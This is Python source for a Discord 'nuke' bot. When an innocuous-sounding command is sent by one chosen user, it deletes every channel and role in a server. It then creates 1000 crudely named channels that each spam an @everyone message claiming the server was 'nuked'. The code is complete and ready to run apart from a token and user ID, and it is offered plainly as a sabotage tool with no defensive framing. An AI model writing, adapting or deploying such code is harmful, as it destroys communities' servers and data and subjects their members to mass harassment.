import discord
import random
import string
from discord.ext import commands

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'eyyo wassup {bot.user}')

@bot.command(name='hey') # instead of !hey cmd u can set whatever u want here
async def nuke_channels(ctx):
    allowed_user_id = 12345678910 # enter the id of the person who will use the bot command
    if ctx.author.id != allowed_user_id:
        await ctx.send("You don't have permission to use this command!")
        return
    
    guild = ctx.guild

    roles_to_delete = guild.roles
    
    for channel in guild.channels:
        await channel.delete()

    for role in roles_to_delete:
        try:
            await role.delete()
        except Exception as e:
            print(f"Failed to delete {role.name} error occurred: {e}")

    for i in range(1000):
        random_letters_text = ''.join(random.choices(string.ascii_lowercase, k=5))
        text_channel = await guild.create_text_channel(f'sex-{random_letters_text}')
        await text_channel.send("Server nuked by yakut 💫 @everyone")

bot.run('enter ur token')
